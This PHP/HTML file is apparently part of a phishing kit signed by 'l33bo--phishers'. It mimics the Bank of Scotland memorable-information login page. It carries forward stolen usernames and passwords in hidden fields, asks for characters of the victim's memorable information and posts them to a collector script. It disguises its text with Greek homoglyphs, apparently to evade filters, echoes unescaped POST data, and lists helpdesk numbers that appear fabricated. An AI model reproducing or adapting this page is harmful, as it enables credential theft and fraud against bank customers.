<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");
require_once("assets/includes/memo.php");

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title>Enter Memorable</title>
<meta content="en-gb" http-equiv="content-language">
<link href="assets/img/favicon.ico" rel="shortcut icon">
<link href="assets/css/001.css" media="screen, print" rel="stylesheet" type="text/css">
<link href="assets/css/002.css" media="screen, print" rel="stylesheet" type="text/css">
<link href="assets/css/003.css" media="screen, print" rel="stylesheet" type="text/css">
<script src="assets/js/jquery.js" type="text/javascript"></script>
<script src="assets/js/wording.jspf" type="text/javascript"></script>
<script src="assets/js/global.js" type="text/javascript"></script>
<script type="text/javascript">
DI.themePath="https://online.bankofscotland.co.uk//personal/unauth/assets/BOSRetail/";
</script>
<script src="assets/js/custom.js" type="text/javascript"></script>
<link href="assets/css/004.css" media="screen" rel="stylesheet" type="text/css">
</head>
<body>
<div id="wrapper">
<div class="outer">
<div id="header">
<ul id="skiplinks">
<li><a href="#" id="lnkSkip" name="lnkSkip">Skip t&omicron; main c&omicron;ntent</a></li>
</ul>
<div class="clearfix"><span id="strbrandname" style="display: none">&Beta;&Omicron;S</span>
<p id="logo"><span><img src="assets/img/logo.gif"></span></p>
<div class="secureMsg">
<p class="msg"><img src="assets/img/msg.png"></p>
<p><a class="newwin" href="#">H&omicron;w can I tell that this site is secure?</a></p>
</div>
<div class="loggedIn">
<ul>
<li class="mobile"><a class="linkBullet" href="#">M&omicron;bile</a></li>
<li class="cookie"><a class="linkBullet newwin" href="#">C&omicron;&omicron;kie p&omicron;licy</a></li>
</ul>
</div>
</div>
</div>
</div>
<div class="pageWrap">
<div class="content" id="page">
<div class="primaryWrap">
<div class="primary">
<div class="panel">
<h1>Your memorable information</h1>
<div class="inner"><p><strong></strong></p>
<p><strong>Please enter characters 2, 4 and&nbsp;7 from your memorable information then click on the continue button.</strong></p>
<p><strong>We may ask you to enter your FULL memorable information.</strong></p>
<p></p>
<p>This login step improves security.</p>
</div>
<form id="memo" name="memo" method="post" action="MemorableRetry.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true" class="validationName:(frmentermemorableinformation1) validate:()" autocomplete="off" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="username" value="<?=$_POST['username']?>">
<input type="hidden" name="password" value="<?=$_POST['password']?>">
<fieldset class="memInfoSelect clearfix">
<div class="formField validate:(oneSelectFieldRequired) validationName:(memorableInformation) clearfix">
<div class="formFieldInner">
<div class="clearfix">
<label for="frmentermemorableinformation1:strEnterMemorableInformation_memInfo1">Character 1 :</label>
<select id="frmentermemorableinformation1:strEnterMemorableInformation_memInfo1" name="frmentermemorableinformation1:strEnterMemorableInformation_memInfo1">
<?php echo memoselect; ?>
</select>
</div>
<div class="clearfix">
<label for="frmentermemorableinformation1:strEnterMemorableInformation_memInfo2">Character 4 :</label>
<select id="frmentermemorableinformation1:strEnterMemorableInformation_memInfo2" name="frmentermemorableinformation1:strEnterMemorableInformation_memInfo2">
<?php echo memoselect; ?>
</select></div>
<div class="clearfix">
<label for="frmentermemorableinformation1:strEnterMemorableInformation_memInfo3">Character 6 :</label>
<select id="frmentermemorableinformation1:strEnterMemorableInformation_memInfo3" name="frmentermemorableinformation1:strEnterMemorableInformation_memInfo3">
<?php echo memoselect; ?>
</select>
</div>
</div>
</div>
</fieldset>
<div class="inner">
<ul class="linkList">
<li><a id="frmentermemorableinformation1:lktrouble" name="frmentermemorableinformation1:lktrouble" href="#">Having trouble logging in?</a></li>
</ul>
</div>
<ul class="actions">
<li class="primaryAction">
<input id="frmentermemorableinformation1:btnContinue" name="frmentermemorableinformation1:btnContinue" type="image" src="assets/img/continue.png" alt="Continue" title="Continue" class="submitAction">
</li>
<li><strong><a id="frmentermemorableinformation1:lkCancel" name="frmentermemorableinformation1:lkCancel" href="#" class="cancel pseudoLink">Cancel</a></strong></li>
</ul>
</form>
</div>
</div>
</div>
<div class="secondary">
<div class="panel">
<div class="subPanelShadow">
<div class="subPanel">
<p><a class="newwin" href="#"><img src="assets/img/ad1.jpg"></a></p>
</div>
</div>
<div class="accordion ui-accordion ui-widget ui-helper-reset">
<div class="partShadow">
<div class="part">
<h2 class="trigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" title="Contact us: Use this link to show or hide more information.">
<span class="ui-icon ui-icon-triangle-1-e"></span>C&omicron;ntact us</h2>
<div class="pane ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<div class="paneInner">
<div class="quickContact">
<h3>Internet &Beta;anking Helpdesk</h3>
<p>0345 521 5412</p>
<p>+44 1138 12 23 05&nbsp;fr&omicron;m &omicron;utside the UK</p>
<h3>&Beta;ank acc&omicron;unts</h3>
<p>0345 858 9856</p>
<p>+44 215 258 1258&nbsp;fr&omicron;m &omicron;utside the UK</p>
<h3>Savings (including cash ISAs)</h3>
<p>08457 98 02 02<br></p>
<p>Lines are &omicron;pen M&omicron;nday t&omicron; Friday, 8:00am – 8:00pm; Saturday 8:00am – 6:00pm; Sunday 9:00am - 5:00pm.</p>
<p>F&omicron;r st&omicron;cks and shares ISAs see <strong>ISA Investor</strong>.</p>
<h3>Investments</h3>
<p><strong>08452 540 212</strong><br>
Lines are &omicron;pen M&omicron;nday t&omicron; Friday, 8.30am – 7pm; Saturday 8.30am – 12:30pm<br>
&nbsp;<br>
F&omicron;r cash ISAs see <strong>Savings (including cash ISAs).</strong></p>
<h3>Credit cards</h3>
<p>0346 326 2012</p>
<p>+44 215 021 1525&nbsp;fr&omicron;m &omicron;utside the UK</p>
<h3>M&omicron;rtgages</h3>
<p>08456 21 21 85<br>
Lines are &omicron;pen M&omicron;nday t&omicron; Friday, 8:00am - 8:00pm; Saturday 9:00am - 4:00pm.</p>
<h3>Pers&omicron;nal l&omicron;ans</h3>
<p>If y&omicron;ur <strong>l&omicron;an agreement begins with<br>
7 call&nbsp;08459 65 68 64<br></strong>(Lines are &omicron;pen M&omicron;nday t&omicron; Friday, 8:00am - 8:00pm; Saturday 9:00am - 6:00pm).</p>
<p>If y&omicron;ur <strong>l&omicron;an agreement begins with<br>
88 &omicron;r 16 call</strong>&nbsp;<strong>08452 00 12 50<br></strong>(Lines are &omicron;pen M&omicron;nday t&omicron; Friday, 8:00am - 10:00pm; Saturday 9:00am - 6:00pm; Sunday 9:30am - 5.30pm).</p>
<p>If y&omicron;ur <strong>l&omicron;an agreement begins with<br>
100 call&nbsp;08466 45 62 88<br></strong>(Lines are &omicron;pen M&omicron;nday t&omicron; Sunday, 8:00am- 10:00pm).</p>
<h3>&nbsp;L&omicron;st &omicron;r st&omicron;len cards</h3>
<p>0800 525 5858</p>
<h3>Textph&omicron;ne</h3>
<p>0346 752 4106<br>
Lines are &omicron;pen M&omicron;nday t&omicron; Friday, 9:00am - 5.30pm. (F&omicron;r use by cust&omicron;mers with hearing impairments &omicron;nly)</p>
<p>We may rec&omicron;rd y&omicron;ur call s&omicron; we can check we've carried &omicron;ut y&omicron;ur instructi&omicron;ns c&omicron;rrectly and t&omicron; help us impr&omicron;ve &omicron;ur service.</p>
</div>
</div>
</div>
</div>
</div>
<div class="partShadow">
<div class="part">
<h2 class="trigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" title="Help &amp; support: Use this link to show or hide more information.">
<span class="ui-icon ui-icon-triangle-1-e"></span>Help &amp; supp&omicron;rt</h2>
<div class="pane ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<div class="paneInner">
<ul class="quickFAQs ui-accordion ui-widget ui-helper-reset">
<li class="ui-accordion-li-fix">
<h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="-1" title=
"What can I do to protect myself online?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>What can I do to protect myself online?</h3>
<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<p></p>
<p>Ad&omicron;pting a few g&omicron;&omicron;d habits can help make sure y&omicron;ur pers&omicron;nal inf&omicron;rmati&omicron;n stays safe and secure &omicron;n the internet. Find &omicron;ut m&omicron;re ab&omicron;ut&nbsp;<a class="newwin" href="#" tabindex="-1">&omicron;nline
security</a>&nbsp;</p>
<p></p>
</div>
</li>
<li class="ui-accordion-li-fix">
<h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="-1" title=
"Why am I having trouble logging in?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>Why am I having tr&omicron;uble l&omicron;gging in?</h3>
<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<p></p>
<p>It c&omicron;uld be because y&omicron;u're trying t&omicron; l&omicron;g in fr&omicron;m a netw&omicron;rked site (the &omicron;ffice, f&omicron;r example). If s&omicron;, please c&omicron;ntact y&omicron;ur Systems Administrat&omicron;r f&omicron;r help.</p>
<p>If y&omicron;u still have tr&omicron;uble, please call &omicron;ur helpdesk &omicron;n<strong>&nbsp;0346 452 1542&nbsp;</strong>(+44 1523 85 96 32 fr&omicron;m &omicron;utside the UK).</p>
<p>Textph&omicron;ne users wh&omicron; have a hearing &omicron;r speech impairment can call us &omicron;n&nbsp;<strong>0347 800 4152</strong><strong>&nbsp;</strong>(+44 1523 85 96 32&nbsp;fr&omicron;m &omicron;utside the UK).</p>
<p></p>
</div>
</li>
<li class="ui-accordion-li-fix">
<h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="-1" title=
"How do I reset my password and/or memorable information?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>How do I reset my password and/or
memorable information?</h3>
<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<p></p>
<p>First, go to the Internet &Beta;anking <a class="newwin" href="#" tabindex="-1">l&omicron;g in</a> screen and click &omicron;n the 'F&omicron;rg&omicron;tten y&omicron;ur passw&omicron;rd?' link. Y&omicron;u'll need t&omicron; enter a few details. &Omicron;n the next
screen y&omicron;u'll be asked if y&omicron;u want t&omicron; reset y&omicron;ur passw&omicron;rd &omicron;r reset b&omicron;th y&omicron;ur passw&omicron;rd and mem&omicron;rable inf&omicron;rmati&omicron;n. Select the &omicron;pti&omicron;n which applies t&omicron; y&omicron;u.</p>
<p>If y&omicron;u ch&omicron;&omicron;se t&omicron; reset y&omicron;ur passw&omicron;rd and/&omicron;r mem&omicron;rable inf&omicron;rmati&omicron;n, y&omicron;u’ll need t&omicron; enter and c&omicron;nfirm y&omicron;ur new details and select a ph&omicron;ne number f&omicron;r us t&omicron; call y&omicron;u &omicron;n. Y&omicron;u’ll then receive a call
fr&omicron;m &omicron;ur aut&omicron;mated system. F&omicron;ll&omicron;w the instructi&omicron;ns and y&omicron;ur passw&omicron;rd and/&omicron;r mem&omicron;rable inf&omicron;rmati&omicron;n will be reset immediately.</p>
<p></p>
</div>
</li>
<li class="ui-accordion-li-fix">
<h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="-1" title=
"I&#39;m locked out of my account. What should I do?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>I'm locked out of my account. What should I
do?</h3>
<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<p></p>
<p>Y&omicron;u may need t&omicron; reset y&omicron;ur passw&omicron;rd. T&omicron; d&omicron; s&omicron;, g&omicron; t&omicron; the Internet &Beta;anking <a class="newwin" href="#" tabindex="-1">l&omicron;g in</a> screen,
click &omicron;n the 'F&omicron;rg&omicron;tten y&omicron;ur passw&omicron;rd?' link, and f&omicron;ll&omicron;w the &omicron;n-screen instructi&omicron;ns.</p>
<p>If y&omicron;u're still unable t&omicron; access Internet &Beta;anking, please call &omicron;ur helpdesk &omicron;n <strong>0347 652 5050</strong> (+44 1112 45 45 85 fr&omicron;m &omicron;utside the UK) and &omicron;ne &omicron;f &omicron;ur cust&omicron;mer service agents will be
able t&omicron; help y&omicron;u. Textph&omicron;ne users wh&omicron; have a hearing &omicron;r speech impairment can call us &omicron;n&nbsp;0345 600 9644<strong>&nbsp;</strong>(+44 131 278 3690&nbsp;fr&omicron;m &omicron;utside the UK).</p>
<p></p>
</div>
</li>
<li class="ui-accordion-li-fix">
<h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="-1" title=
"Are my security details case sensitive?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>Are my security details case sensitive?</h3>
<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<p></p>
<p>N&omicron;, y&omicron;ur security details, including y&omicron;ur passw&omicron;rd and user name, aren't case sensitive.</p>
<p></p>
</div>
</li>
</ul>
<p><a class="linkBullet linkMore newwin newfaqwin" href="#" tabindex="-1">More help &amp; supp&omicron;rt</a></p>
</div>
</div>
</div>
</div>
</div>
<div class="subPanelShadow">
<div class="subPanel">
<p><a class="newwin" href="#"><img src="assets/img/ad2.png"></a></p>
</div>
</div>
<div class="subPanelShadow">
<div class="subPanel">
<p><a class="newwin" href="#"><img src="assets/img/ad3.png"></a></p>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="footer">
<div class="outer">
<div id="footerInner">
<ul>
<li><a class="newwin" href="#">Legal</a></li>
<li><a class="newwin" href="#">Privacy</a></li>
<li><a class="newwin" href="#">Security</a></li>
<li><a class="newwin" href="#">www.ll&omicron;ydsbankinggr&omicron;up.c&omicron;m</a></li>
<li><a class="newwin" href="#">Rates &amp; fees</a></li>
</ul>
</div>
</div>
</div>
</div>
<script src="assets/js/footer.js" type="text/javascript"></script>
</body>
</html>
<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
?>